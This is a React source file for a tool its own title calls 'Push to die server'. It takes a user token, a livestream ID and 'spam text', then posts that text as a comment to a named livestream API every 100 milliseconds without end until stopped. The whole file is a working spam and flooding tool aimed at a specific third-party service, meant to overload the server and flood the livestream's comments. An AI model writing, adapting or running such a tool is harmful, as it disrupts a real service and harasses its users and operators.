import React, { useRef, useMemo, useState, useEffect } from "react";
import { Row, Col, Input, Button } from "antd";
import { Socket, io } from "socket.io-client";
import "./App.css";
import "antd/dist/antd.css";
import { create } from "apisauce";

function App() {
  const [isPushToDie, setPushToDie] = useState(false);
  const [token, setToken] = useState<string>("");
  const [livestreamid, setLivestreamid] = useState<string>("");
  const [spamText, setSpamText] = useState<string>("");
  const interval = useRef<any>(null);

  const APIInstant = useMemo(
    () =>
      create({
        baseURL: "http://api.ogo.winds.vn/api/v1",
        timeout: 20000,
        headers: { "Content-Type": "application/json", token: token },
      }),
    [token]
  );

  // infinity call callback setInterval per 100
  useEffect(() => {
    if (isPushToDie && token && livestreamid && spamText) {
      interval.current = setInterval(function run() {
        requestPostCommendLivestream();
      }, 100);
    } else {
      clearTimeout(interval.current);
      setPushToDie(false);
    }
  }, [isPushToDie]);

  // call api
  const requestPostCommendLivestream = async () => {
    try {
      const res = await APIInstant.post(`/livestream/${livestreamid}/comment`, {
        content: spamText,
      });
      console.log("res", res.data);
    } catch (error) {
      console.log(error);
      clearTimeout(interval.current);
    }
  };

  return (
    <div className="App">
      <Col style={{ width: "90%", marginLeft: "5%" }}>
        <Row justify="center">
          <h1>Push to die server</h1>
        </Row>

        <Row>
          <label>user token:</label>
          <Input
            placeholder="token..."
            value={token}
            onChange={(e) => setToken(e.target.value)}
          />
        </Row>
        <Row>
          <label>livestream-id:</label>
          <Input
            placeholder="livestream id..."
            value={livestreamid}
            onChange={(e) => setLivestreamid(e.target.value)}
          />
        </Row>
        <Row>
          <label>spam text:</label>
          <Input
            placeholder="spam text..."
            value={spamText}
            onChange={(e) => setSpamText(e.target.value)}
          />
        </Row>

        <Row style={{ marginTop: 20 }}>
          <Button
            type="primary"
            loading={isPushToDie}
            onClick={() => setPushToDie(true)}
          >
            Push to die (click this to start call)
          </Button>
          <Button
            type="ghost"
            disabled={!isPushToDie}
            onClick={() => setPushToDie(false)}
          >
            Stop (click this to stop call)
          </Button>
        </Row>
      </Col>
    </div>
  );
}

export default App;
